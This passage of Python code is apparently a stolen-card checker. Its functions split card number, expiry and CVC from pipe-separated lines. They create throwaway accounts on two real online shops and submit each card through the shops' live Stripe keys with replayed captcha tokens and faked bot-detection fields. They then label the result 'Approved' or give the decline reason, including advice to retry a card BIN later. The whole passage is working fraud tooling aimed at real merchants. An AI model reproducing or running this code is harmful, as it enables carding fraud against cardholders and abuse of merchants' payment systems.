	elif 'lookup_error' in vbv:
	       return 'Unknown Error ⚠️'
	return vbv
	

	

		
		
		
		
		
		










def Tele1(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
					
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
				
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
					
		return f"{name}{number}"
	username = (username())
				
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
				
	corr = generate_random_code()
				
	sess = generate_random_code()
	
	headers = {
	    'authority': 'byronbaycoffeeco.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'none',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	response = r.get('https://byronbaycoffeeco.com.au/my-account/', cookies=r.cookies, headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
				
	headers = {
	    'authority': 'byronbaycoffeeco.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://byronbaycoffeeco.com.au',
	    'referer': 'https://byronbaycoffeeco.com.au/my-account/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	data = {
	    'email': acc,
	    'mailchimp_woocommerce_newsletter': '1',
	    'wc_order_attribution_source_type': 'typein',
	    'wc_order_attribution_referrer': '(none)',
	    'wc_order_attribution_utm_campaign': '(none)',
	    'wc_order_attribution_utm_source': '(direct)',
	    'wc_order_attribution_utm_medium': '(none)',
	    'wc_order_attribution_utm_content': '(none)',
	    'wc_order_attribution_utm_id': '(none)',
	    'wc_order_attribution_utm_term': '(none)',
	    'wc_order_attribution_utm_source_platform': '(none)',
	    'wc_order_attribution_utm_creative_format': '(none)',
	    'wc_order_attribution_utm_marketing_tactic': '(none)',
	    'wc_order_attribution_session_entry': 'https://byronbaycoffeeco.com.au/my-account/',
	    'wc_order_attribution_session_start_time': '2024-11-03 09:45:25',
	    'wc_order_attribution_session_pages': '2',
	    'wc_order_attribution_session_count': '1',
	    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	    'woocommerce-register-nonce': register,
	    '_wp_http_referer': '/my-account/',
	    'register': 'Register',
	    'ak_bib': '1730627301252',
	    'ak_bfs': '1730627325983',
	    'ak_bkpc': '32',
	    'ak_bkp': '19;8,75;7,84;8,42;3,173;3,7;3,138;3,17;4,178;6,21;3,155;4,65;4,144;6,31;3,108;3,280;4,57;5,90;1,914;1,1;3,349;5,752;4,263;8,136;5,104;5,246;3,631;3,1;5,3;5,187;7,159;4,205;',
	    'ak_bmc': '8;5,25701;',
	    'ak_bmcc': '2',
	    'ak_bmk': '',
	    'ak_bck': '',
	    'ak_bmmc': '0',
	    'ak_btmc': '3',
	    'ak_bsc': '3',
	    'ak_bte': '277;135,200;385,150;200,119;249,921;201,203;30,234;235,23352;64,2060;',
	    'ak_btec': '9',
	    'ak_bmm': '',
	}
	
	response = r.post('https://byronbaycoffeeco.com.au/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
	    'authority': 'byronbaycoffeeco.com.au',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://byronbaycoffeeco.com.au/my-account/payment-methods/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://byronbaycoffeeco.com.au/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	
	
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&billing_details[name]=+&billing_details[email]=kdvfjdvdjdvrjfhksb%40gmail.com&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=b3cbdc8c-14a9-4fcb-8f0d-a44b74b1d2ac6fe321&muid=58fbbbff-3bdb-4969-9a50-d1894262e547f43899&sid=5fa2cd10-7e0c-4d51-a46f-9a66b7309785b327c9&payment_user_agent=stripe.js%2Fb2d52e5892%3B+stripe-js-v3%2Fb2d52e5892%3B+split-card-element&referrer=https%3A%2F%2Fbyronbaycoffeeco.com.au&time_on_page=88068&key=pk_live_51HOY8QBWrt9NB6UPYYgQtNC4jAKKAOlrGNDQx8Pv87HRT4TF4OwvgZcYDzBdocCNVCLYWS8AaN5DTCkAcoF27a8Y00Yb5dB0Pg&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiWmNyMlhQY3RzQ1RwR2tVdjVqd1FnSUc1c1YwRU5Lck1FcHh5VG1sNmlXUVBSY3psRTU1V2xwTW1qbjRiNkdBQ3ZYODNoMHdydDRVMHVLM2VBdS85RGtYdnpua2drN2pCUVgxTUxzSWd2SFNOMHphcDkrT1R3NDZOMnFIdC9RRnNCbUx3bE1sUkRLSXZIOTNuVzJUM3RoVzBOMUdPNHBOYWVvazZJQ2xZVmFkampVQndrRUh2OXFEanAzTVBwMFpXM0E5NUFhb1VNS1lyZHluYXRIMnVYSlFDVENQVmZiNkdCUCt4WWFCUS9pTlhUUUpnUFVnbk1ETHRyNHN5S3FSZUZwbXIzMENRSHpybVJHY1EyMnNLbmxpelRRbGhLQVJYWXlnL3Q3QmdUT09tRU1TTWE0UUxOV1lYeDB3UmUxODRneldOTGVyQ2JUTkpxTmduV3M2WGtjc1hCLzRJL29xRjM3Y0VpYXV6ZEs3b1I0Qm5TWHgxZ3F5TXgyRmZidk5sT29qQ3l6ZS95dnVvdFhKSlpUUDV5UEcrcUNnUXQxQk11aXVVZGZNVVVmelFUUE5velU0TTJBSDF1RzVDc2tqRmpjdUlVTjQ1RFdmcmpaVGFnY3R5a0poQWpUUDZPbGdlZE5wSGRiSGFQT2tBQXZtVnFKcXpaa2xHdWJaOVY3Z2ZyM1hleGNQSjdVcmJ3bWFZanIzU3JsWC94VXBvdy9kc2YyNlBpZGg0cTZIaFE0SlF1OU9ra2dnNk82Y0VIaElOZEw4RkJHOGk0dHVVNUFxbkNQZEFDc0ZIY0NhTmgwSWMycjlSa1NsUVI1ZGk3S1hDYmlnSUtYZm94SzlvMTd0TmRKV3JJRlhrOTNzVmQ3cDJzekZSMnhHR2tDUnNmRGZscU9Fdmh0U1JMTkh2WCt4bkZtM3JNeXV2QVhzYmU3QzMxSnA3WE5Ea1R3OGsvU1pDYkZlWFZLekhEYkJPR3UzMVYvS2dHVTJ3Y0xxNUs4YmxpN0VSd09rTzZVM1YxbHdzWk1UenRiZkYzZldOOWRWSy91ZzBBWTNmNWFKN29JbzQzaFRiRUZnZzdlWFpzMGQ0UWkrbGt1dEg2U3RydDJLNGdhb1h3Wi9JUFNUOVFqbFFKVTBtakZ2RHZZWlZ0enZjbU5lN3JkdDducDRGbzZnOU5aUDF2RFpsanAyODlWdFA0VFVxNStJY1J1amdPUG50cm9SQUs0b2NFVUlYemRnSC82V3lRK2cyY1VmMUc4L0tnaThlQXpwZS9EKzVqVXZLelhBUUUyQzVmMkpybFBlV3RIZUdqR1gvemtaZ2hHR2w1RWdKUFpPUU80c1crdVdsV1dLZmlsQkYxMTQyZi9WeExhblpZNDlsQ2l3dDA0d2JFWnBQWElEeHdFS3Z4cGpBVy9pSWRPUTNTV2N1Tk5nSmNMb01ObVRqYXRpeDgvTzJoUHZmd1JNQmhKT0Y1SzJVaG5RSy9EelhvUEdLUXBIcWlhalV6d3k0dUFEN0NBb0VyUlVScENoSVBWN2E2d2Y5RWRzNDFNcEF5SDJHSEJlM3puRjVWalMwRG1YSXBHc0ZFQU9jSFdiWnFWY3lnaDlGRGhDNE9qR3lYTHh3UWtXREF2NHVIOHc0dVJDMW5lRlpORjhMYklIVUI1ZDcwK1lreXlnUXg5VDdZbDlocnhXT1hORUs1MU5Od0haQmlZdXBNZStoSS9vNWpOanVrejhoTUczcWFDaE5TcjlQLzV1bHp3dGh1clBRVzhPTW05dW41S1NFV2U2UUUyUzlFUEkxRS84K3BjaXhVckV4alQ1dnF6U3VyQUdJNHdtbG1UM1FJU29RUzNEM1hhY2xBMXVSY2RtM3pUV1hPc2l3Lyt6TFhNbjlJUWRGOTRCLzduWGxGQks2SjFMVDlseHgxTlNjM3RSM1BObXJFRm00OGozekZ0akRWRk80Q3JSNy9HcTF1aWhKRGhwVThwSjNZNlRwalMwSFo5ZzVqdlQ0UkEyeVZpR1lvSlJSek92WjJYMEY3VzFSbFBVZUo1QnY4UDh1ZW9PVldhNWN6WVUyUzg4WGVibDc0NVZZUHpWNmV6b3p6b0N3QTZ0eGxuWXZ4YUM4NmdBWmNleTZFL3BZL2Z6bHYvVHlpSkc5Nk9pZEs0clVacFIxaGx6dVRKbjd2cDNQdGl6Z2J6dWlLV2IySGdUTFRKaWZXZks4YS9ubGROYm0yY3VNSjUxbmNjL00xTWpLSkRKL3VkRmlJTGl3bXRoZHdJWGs0aml0RzVRVmpPUXVmbFhhMFF3UEg0MFNkWGhNS2lkbTNISFJNU3YrelhvRUd2R1FiV3dOMDAvWUZyOUVndjdjbTVuR3VsejQ2SEphMS9TR3Azdm1SU2RpR0ZvbVhyaENvWENGQmMrR0ZxOVFIWEJBWDVLZE1HTVl5TGh5OUZ4RDVpL1daSk9qYUdEL0FDT0JuQnNQbm9sRnZDRUs4OTFHcnVjMUpuRFhOVXRmOENoVXVZalFFMFd3VzRac3FCK1g4UmEvaXlHRGg4YXlvaWF6QjBjRitGblNaUWxUWnlsKzE3Z1FzOUN5b21uREZjeWxJSGFobFZ4c1U4N2Q3VXpkNEtrUGxzTE40L0psYmxFQkdJcU83T3hrS21IT29RREwxVEUxUWR5QlpIQ2xDdlZYVnY1dHhjMTk5d1NJcm1vYktaa1hPTjM4Z2Y1NDBVTU1ad1RQcDd1SHVTSmRVeUJZbnBtcTRCNjNlSzZYbDJGdkM5a0FXZXdra2hjQTBWdjlLRTcrQ1g3Mk0xNkcrN0dIMXlUOFZnbnh1V2RBYTJSZ0oxUDNjMjd6SGlWUnRKMWczeVhrV08vaks3Y2RJZUloaGhETTlPM1FvV3VraUhSemJUTzk0NTQ9IiwiZXhwIjoxNzMwNjI3NjI5LCJzaGFyZF9pZCI6MzM5NTEwMzAzLCJrciI6IjQ3NzY3NDljIiwicGQiOjAsImNkYXRhIjoiMFpWNThCZlhpcnR2U2o3dXdMbS84YlBNdFBYM1JFQjZ4RHFTajNRSU4wMHRLRWJ3T0tPc25TTkxSTHdhUllhUnE0eHd5UmowcFgvOHVWL2cySlRkLyt0dVlpWHF2ZzFvakE4WTYxSEVrU2FOaUV2cmhJM01FUlh6bloxWU80VE1iSWY1czdpLzZ5QVNKNkZOaGlYQllYNHp1QU0zTUZUZmFOWkI2aE8wUzFIaVlHdW9VNngrRTlHS1pSaEdwcVFKM2p5M0wxOVduTkptNHY4NyJ9.wRXa6ZijYt0bj8WlYwduLl98ePnOROoY4pL0_AVGmMQ'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	if not 'id' in response.json():
		print('ERORR CARD')
	else:
		id=response.json()['id']
	
	headers = {
	    'authority': 'byronbaycoffeeco.com.au',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://byronbaycoffeeco.com.au',
	    'referer': 'https://byronbaycoffeeco.com.au/my-account/add-payment-method/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	response = r.post('https://byronbaycoffeeco.com.au/', params=params, cookies=r.cookies, headers=headers, data=data)
	text = response.text
	pattern = r'Reason: (.+?)\s*</li>'
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
	else:
		if 'success' in text:
			result = "success"
		elif 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
		elif 'Please wait for 20 seconds.' in text:
			result = "try again"
		else:
			result = "Your card was declined."
	if 'avs' in result or 'success' in result or 'Duplicate' in result or 'Insufficient Funds' in result:
		return 'Approved'
	else:
		return result
		
		



def capture(string, start, end):
	start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
	return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

def Telev(ccx):
	ccx = ccx.strip().split('\n')[0]
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
					
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
				
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
					
		return f"{name}{number}"
	username = (username())
				
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
				
	corr = generate_random_code()
				
	sess = generate_random_code()
	
	headers = {
	    'authority': 'puressentialsllc.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'cache-control': 'max-age=0',
	    'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryBDgTFrpnHpYTpm4A',
	    'origin': 'https://puressentialsllc.com',
	    'referer': 'https://puressentialsllc.com/product/hangnover-1-5oz/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	data = '------WebKitFormBoundaryBDgTFrpnHpYTpm4A\r\nContent-Disposition: form-data; name="attribute_pa_single-1-5oz"\r\n\r\nsingle-1-5oz\r\n------WebKitFormBoundaryBDgTFrpnHpYTpm4A\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryBDgTFrpnHpYTpm4A\r\nContent-Disposition: form-data; name="add-to-cart"\r\n\r\n1156\r\n------WebKitFormBoundaryBDgTFrpnHpYTpm4A\r\nContent-Disposition: form-data; name="product_id"\r\n\r\n1156\r\n------WebKitFormBoundaryBDgTFrpnHpYTpm4A\r\nContent-Disposition: form-data; name="variation_id"\r\n\r\n2142\r\n------WebKitFormBoundaryBDgTFrpnHpYTpm4A--\r\n'
	
	response = r.post('https://puressentialsllc.com/product/hangnover-1-5oz/', cookies=r.cookies, headers=headers, data=data)







	headers = {
	    'authority': 'puressentialsllc.com',
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'referer': 'https://puressentialsllc.com/cart/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'document',
	    'sec-fetch-mode': 'navigate',
	    'sec-fetch-site': 'same-origin',
	    'sec-fetch-user': '?1',
	    'upgrade-insecure-requests': '1',
	    'user-agent': user,
	}
	
	response = r.get('https://puressentialsllc.com/checkout/', cookies=r.cookies, headers=headers)
	
	
	anonce = capture(response.text, 'name="woocommerce-process-checkout-nonce" value="','"')


	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': user,
	}
	
	data = f'billing_details[name]=Tome+Hunty&billing_details[email]={acc}&billing_details[phone]=1+253-290-6967&billing_details[address][city]=Mold&billing_details[address][country]=US&billing_details[address][line1]=56+High+St&billing_details[address][line2]=&billing_details[address][postal_code]=10090&billing_details[address][state]=NY&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&payment_user_agent=stripe.js%2F957f55b385%3B+stripe-js-v3%2F957f55b385%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fpuressentialsllc.com&time_on_page=65951&client_attribution_metadata[client_session_id]=d526f506-c08c-4a03-bc53-d6b144360874&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=b3cbdc8c-14a9-4fcb-8f0d-a44b74b1d2ac6fe321&muid=3dfd9f4b-4a23-495e-90ad-4cfffe6fb87ccb7c2b&sid=68e57056-3a7e-444a-8a50-f1c0a57003ef9bac20&key=pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNza2V5IjoiY0s4U2NSUUlJZW0waVFMN1B2eTBuQjA0NXpQYUwyRzAreGNnT0FFSTlIL2IvWCt6Nk4yUmtoTlhVZ3JzRU5hNDJ0cGFMUUhWY3VYYkxqUStacUQyNXdkWDF4bVBteERVQUFVaENpcmltRDB4SzJGSUpMaDIrU1FtSENZNWxhalhkOUxNQUdZTStXaXJ4bnd2RXQ0aXhKYVNwSEwrT2dUT2E5NWF6RGg5S1czK0lhT2tBQVRZUnRiSGwxenE3MGVBOFNiNmphdks0RmxzWjVOSDUwNXU3eFBJVzI3YzJGblFSOEZ0dmZSSVQzTG1adHB2WXQ0U1dhVXh4NytrOWgxOFlWdWErNWlWMmhXMzFhUXJndlVmUEFWd1o2SWN1NzNsTmpnZ1RzcFNUTld1V09qdjFhaWQzQmYvVUwxVEJsMTZNSW5DYy85OFNXUGNHdUpXR2V4OVRMZTIxVU8zdFVKMW8vS3ZJYy8wVk4zbGRtMUxwbVBVZGJvaVBxQzdKeCtvcFNpYTJLb0dqRHovalZWYzY0SEUwVDVhck15Wk5Eb05VeDUxd3NMbzVURkdickIzM2pBTEFZNGZybVVmdW1DUWFiY0V5V2MyZ3B0T2kzdHNpUGs0L05DdlZSa3JaT0pnYU1pdWNibkd5NjBUWFltVEFTQ0R4Um12SFlLd0MrWE5lME1uWmFWdUJxek4wRmpQWFVwcTlTci9PYTRMZ0orSVB3US9haTRVc3FIaGhacjE4U01YZERsRG82a1NwSmZhVUd6K0dqN2MrU1p5QzBQUUdXVC95RlB1ZTE3ejFXem9yY0tnZ3g4OUIzM3hjZ1RnVFZPS1NYK2JSTm5mY04vcU1INHdqenRoOGlWL3M2WFBBWkx2QjRCS3R3aXptV0VDSWdLOEJGS0JaRERoQWZwclVlZzlCamtYK2I2RWNWeGUra3BQRmtTNm5WQ0hjelRDQ3puajRHZW9hbitydFhFVWRjb3ZubDdZdTN3SDhRYjBYc2xIK2c4MXhCcnJyaWpZZWRiUDZjblJjZ1dtRnl3MDJOd1F3c1RXMVFrTW5KUE5UUlpEKzk5aEdNclZpcDhud2pVQmw1VzhHNURYRkcvM3czWUdFVUJLSGUwOWFLUGk5OGZBYTVBWk92bEIwMFJ2ZkpYczhzenpRVmlMNVZRajBiM3RzMHJMb0xyamdaTWk2STJRZmJtZFlwZklyZU9zakpwa1Vic2dkWEV1TloxVUc2ZEJ4UFMzakJ5dDlLSXFBSkJ2YUNwc2cxc3Y3SVd1Vm53R2NHK3BGR0xDQzV0ZFhLbmlKSTVSQkRtd3FleFFjRDdqKy9Sb1YySE81MWE1ZUFKdFE0a0NvOWVIQkk3czB5b0ZrQkdLSkppSXhxMmNGRXFWS1ovd0w1dGxwVjJLbmxrMktMSEM5YkRZMHRmMGM3WC9EeTVOclVzdlBzUk5pNEJDdzlsWHBBcmVPV0lZVStpUUJJRnBNQk5kZXE3WEI3cWN2Z21xYTVibkpnUHlOMGQxQXIwSGdyS3FvNU5VaENLeHdSTkpjeUc3QnhMYVBZQWpuckowa0piVHRNa054NXZmQ1ZlbGZvMTFFUGZaYVg4UWljSjgvMTRkWnNacW9NUTI0bFVnSVE1U0RVcE9wTEwrZXVUbGhGWk04VDA2cmFYem5lTk9iTzNXb2tlMW43d0loTVRoc1hHWXhJQ2hySHdMSVMxRUVvNExybFp6Y2RLSnNNMGhPdmdrdyt3VkJwY1BnUDB0ZVdTL2t3NTFoZTJtUGFPQ1FwZXI0SWY5UVlWL1ZRL3c4UnNIVUdUaWpaZkhRYitKdU56eVR6TVhoVjlsbjJDUXB0bW9iTjJyM1JiVW1tNUJXQklMR1F1bkkvc3pySkZHSFJXVGdadUhDcEhTMHI4TS9LRVpZbi9WL2ZCSzM5VTcxMDhrSFhXM0NUOWdZWW5qTTFaNUkrWFp0MjJSWUpKQmE1QnU1OTZOQjRRZ1krakdBcy8rbkY4ZzdNNGZKNUU4TFA4VlR0MkgwdEF5T0RIZXp1QWxibGJMZ0Ewd0tBYWRzRjBMaUlFQUI1OCtEaHI5bGN1R0t4bzdLbjlDYnVDS2Y1TlBNczQreEFHM0pwNmREZm1LRkF6T2J2M1ZHN1dKU2VqMEc0OVhNS3dBc3VuWWlOREZ1bUNkbUFYMFB2VEVBTnYxUjlFWHNsWW05N0ljOGdwVlV4cURaanI1Rlh6RUJkRjJFc0hpS1FzLzY4cFlHamRMNmtXRGU3bkhRc1BSNXpzRCtRTzlQWGRSMkZaZEZGU3JzSEtLYW1aTjJKUkpoQWh1NUlQYmFrNFRmV29STjNVa2xPQjc2ajJnVkZSMk0yQ2dtemwrWFpPOTNmcWtNOFBzWUY0MUVtSkVKeXdxVEZIZEU4eW8rbkZhSXJBV1ZlNWMxY1MzSkwwNE9IbjU4eUEwdUo3VTB5R3hkWnJmanBhNUg3aVRvdHpaWldoY0JRaSs5dGduWjluS3pWREVEOWdncTJRWXlmbDk5cEh1TkRPZmZndUdyT01nY0d1b2FGYThOS2ZDUUVFcDBJTlJzVXBrOTFjMVZuSWRNYSs4VzZEdmNjRzZ5bFZIWE9kdndpdUp5TmNaejZONUprU213WkFIN1dkeFV4eTJoSVAzdWlqQkEyYWZNY1lsV3ZLYmVBV0JCQ2I2QnRrZ0lWRmJNS2N5aEJ4T055WWlISlZmWlJCbmVpaGU3RGVleElnS29jSDVmMVZUMG9yNzdPVGlnSHJsSHhjeFdnTjdnZFpIVUsreEgzaVdwck85eFVuWVoyRG15ZlFIMjBjVWxsd09CUkdyRTlObDBtL0E3c25veE5ldGhGOTRua3hBR1dKc2J4YmRHMjdnaHFFa2hORXFUUWhrak5lRWQ3RmNNMG96eWVsd0RoWEs0bFYxZXc9PSIsImV4cCI6MTczMTE2NjcwMCwic2hhcmRfaWQiOjMzOTUxMDMwMywia3IiOiJlNGNmOSIsInBkIjowLCJjZGF0YSI6ImxsQkkwdjJLbURTOXptK3h4bUlwZnhiQ0xnT3JadUw3TEM4VzN0S1dPcHI4ZjgxWE5BV3JPcFJKMENKekxIcE05anRGWnFqUWdLV0VBQU1HbWFkd0lJTUp2V1JDdE41R3VVanl5YzY1UXpEb0ZuUi9GdHZLZUpjR0RmMU9pVXppZkFKbmFuTW5mazllWkxwelc1RVp6U0RPZU05UXRCRU4xQlR1aXhFUm1YL2pqSnEzaXZPSnFzdGZGK0pEczI1dzFvS1VJYVEzR3JvTFpIa3AifQ.wlqIqIqR945LkwBpEBtlGYvrlNH1tD_ue3LSNZGhZBg'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	if not 'id' in response.json():
		print('ERORR CARD')
	else:
		id=response.json()['id']

	headers = {
	    'authority': 'puressentialsllc.com',
	    'accept': 'application/json, text/javascript, */*; q=0.01',
	    'accept-language': 'ar-IQ,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    'origin': 'https://puressentialsllc.com',
	    'referer': 'https://puressentialsllc.com/checkout/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': user,
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    'wc-ajax': 'checkout',
	}
	
	data = f'wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fpuressentialsllc.com%2Fproduct%2Fhangnover-1-5oz%2F&wc_order_attribution_utm_campaign=(none)&wc_order_attribution_utm_source=(direct)&wc_order_attribution_utm_medium=(none)&wc_order_attribution_utm_content=(none)&wc_order_attribution_utm_id=(none)&wc_order_attribution_utm_term=(none)&wc_order_attribution_utm_source_platform=(none)&wc_order_attribution_utm_creative_format=(none)&wc_order_attribution_utm_marketing_tactic=(none)&wc_order_attribution_session_entry=https%3A%2F%2Fpuressentialsllc.com%2Fproduct%2Fhangnover-1-5oz%2F&wc_order_attribution_session_start_time=2024-11-09+15%3A21%3A23&wc_order_attribution_session_pages=8&wc_order_attribution_session_count=1&wc_order_attribution_user_agent=Mozilla%2F5.0+(Linux%3B+Android+10%3B+K)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F124.0.0.0+Mobile+Safari%2F537.36&billing_email={acc}&wc_order_attribution_source_type=typein&wc_order_attribution_referrer=https%3A%2F%2Fpuressentialsllc.com%2Fproduct%2Fhangnover-1-5oz%2F&wc_ord